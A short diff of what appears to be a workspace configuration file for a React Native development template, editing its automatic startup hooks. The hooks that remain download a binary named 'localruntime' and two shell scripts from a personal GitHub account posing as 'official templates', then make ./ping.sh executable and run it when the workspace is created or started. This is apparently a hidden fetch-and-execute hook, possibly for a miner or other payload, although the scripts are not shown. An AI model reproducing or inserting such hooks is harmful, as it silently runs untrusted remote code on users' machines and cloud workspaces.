@@ -21,8 +21,6 @@
       onCreate = {
         install = "npm ci --prefer-offline --no-audit --no-progress --timing && npm i @expo/ngrok@^4.1.0";
         create-tmux-sessions = "
-            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
-            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
             wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
         ";
       };
@@ -35,8 +33,6 @@
           npm run android -- --port 5554 --tunnel
         '';
         start-ping-sessions = "
-            rm -rf ping.sh
-            rm -rf trace.sh
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
             chmod +x ping.sh && chmod +x trace.sh && ./ping.sh
